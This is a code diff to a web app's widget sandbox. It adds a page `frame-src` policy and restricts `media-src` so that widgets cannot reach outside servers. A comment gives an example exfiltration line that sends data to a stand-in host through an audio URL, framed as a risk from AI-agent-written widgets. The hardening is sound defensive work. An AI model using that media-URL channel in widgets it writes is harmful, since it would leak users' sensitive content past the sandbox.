@@ -123,6 +123,46 @@ export function resolveWidgetSandboxOrigin(
   return { mode: "dedicated", origin };
 }
 
+/**
+ * WHERE ATRIUM'S OWN FRAMES MAY GO — the page's `frame-src`.
+ *
+ * A widget frame may navigate ITSELF with no click (`location.replace(url)`, a form
+ * with `target=_self`), and a navigation is a request: the widget's own policy cannot
+ * stop it (`frame-src` there governs the widget's descendants, not the widget), and
+ * the page had no policy at all. The parent's `frame-src` governs every navigation of
+ * its child frames, whoever starts it. Measured in Chrome 154 (2026-10-01): without
+ * it a simple-mode widget's `location.replace` reached an arbitrary server; with
+ * `frame-src 'none'` on the page the navigation is refused (a frame-src violation)
+ * while `srcdoc` widgets still render — a `srcdoc` document is not fetched, so it is
+ * not checked against `frame-src`.
+ *
+ * What Atrium frames, inventoried: the widget frames only (WidgetPart — `srcdoc` in
+ * simple mode, the sandbox proxy origin in dedicated mode). The document viewer and
+ * the PDF reader draw on canvases and open files in new tabs; nothing else embeds a
+ * frame. So: `'none'` in simple mode, the sandbox origin alone in dedicated mode
+ * (the proxy's own `frame-src 'none'` then holds its inner frame). ONLY this directive
+ * is set — the page's other loads are deliberately left as they are.
+ */
+export function pageFramePolicy(verdict: SandboxOriginVerdict): string {
+  return verdict.mode === "dedicated" ? `frame-src ${verdict.origin}` : "frame-src 'none'";
+}
+
+/** Marks the meta Atrium inserts, so it is inserted once. */
+export const PAGE_FRAME_POLICY_MARKER = "data-atrium-frame-policy";
+
+/** Put `policy` on the page as a `<meta http-equiv="Content-Security-Policy">`, first in
+ *  `<head>`, once. Enforced from insertion on (browsers honour a meta policy added by
+ *  script), and never relaxed afterwards: a policy cannot be removed by removing its
+ *  meta. Called before any widget can render. */
+export function installPageFramePolicy(doc: Document, policy: string): void {
+  if (doc.head.querySelector(`meta[${PAGE_FRAME_POLICY_MARKER}]`)) return;
+  const meta = doc.createElement("meta");
+  meta.httpEquiv = "Content-Security-Policy";
+  meta.content = policy;
+  meta.setAttribute(PAGE_FRAME_POLICY_MARKER, "");
+  doc.head.prepend(meta);
+}
+
 /** The proxy document's URL on the sandbox origin (served at `/`, deploy/widget-sandbox). */
 export function proxyFrameUrl(origin: string): string {
   return `${origin}/`;
@@ -151,11 +191,55 @@ function readProxyGuard(): string {
 }
 export const DOCUMENT_GUARD_HTML = readProxyGuard();
 
-/** The proxy's HTTP policy (headers.json) — the one its inner srcdoc frame inherits.
- *  In simple mode the srcdoc frame would inherit ATRIUM's page policy instead, so the
- *  same policy is carried by a `<meta>` (minus `frame-ancestors`, which a meta cannot
- *  express and which only concerns the proxy itself). */
-export const SIMPLE_MODE_CSP = (proxyHeaders as Record<string, string>)["Content-Security-Policy"]!
+/**
+ * MEDIA, HARDENED — a deliberate divergence from upstream, in BOTH modes.
+ *
+ * Upstream lets a widget play HTTPS audio and video (2026.9.6, `media-src 'self' data:
+ * https: blob:`, src/shared/widget-media.ts). `connect-src 'none'` blocks fetch and
+ * sockets, but a media element is not a connection: `new Audio("https://host/?d=" +
+ * data).load()` reaches any HTTPS server, so a widget — written by an agent that may
+ * have read sensitive content — could carry that content out through a media URL.
+ * Atrium serves the proxy's headers with media restricted to the frame itself and
+ * inline data (`data:`, `blob:`), and puts the same restriction in the simple-mode
+ * policy. The vendored files stay upstream's bytes (their version hash still holds);
+ * only the policy Atrium SENDS differs, in this one directive.
+ */
+export const HARDENED_MEDIA_SRC = "media-src 'self' data: blob:";
+
+/** `csp` with its `media-src` directive replaced by HARDENED_MEDIA_SRC (added when it
+ *  has none — `default-src 'none'` would block media anyway, the directive just says it
+ *  plainly). Every other directive is kept as is. */
+export function hardenWidgetCsp(csp: string): string {
+  const directives = csp
+    .split(";")
+    .map((d) => d.trim())
+    .filter((d) => d !== "");
+  let replaced = false;
+  const out = directives.map((d) => {
+    if (d.split(/\s+/)[0]!.toLowerCase() !== "media-src") return d;
+    replaced = true;
+    return HARDENED_MEDIA_SRC;
+  });
+  if (!replaced) out.push(HARDENED_MEDIA_SRC);
+  return out.join("; ");
+}
+
+/** The headers Atrium SERVES with the proxy (docker/Caddyfile, deploy/widget-sandbox/
+ *  Caddyfile): upstream's (headers.json), with the policy hardened. */
+export const SERVED_PROXY_HEADERS: Readonly<Record<string, string>> = {
+  ...(proxyHeaders as Record<string, string>),
+  "Content-Security-Policy": hardenWidgetCsp(
+    (proxyHeaders as Record<string, string>)["Content-Security-Policy"]!,
+  ),
+};
+
+/** The proxy's HTTP policy as Atrium serves it — the one its inner srcdoc frame
+ *  inherits. In simple mode the srcdoc frame would inherit ATRIUM's page policy
+ *  instead, so the same policy is carried by a `<meta>` (minus `frame-ancestors`, which
+ *  a meta cannot express and which only concerns the proxy itself). A widget document's
+ *  own `<meta>` policy (upstream's wrapper allows https media) cannot loosen it: every
+ *  policy present is enforced, so the strictest wins. */
+export const SIMPLE_MODE_CSP = SERVED_PROXY_HEADERS["Content-Security-Policy"]!
   .split(";")
   .map((d) => d.trim())
   .filter((d) => d !== "" && !d.startsWith("frame-ancestors"))
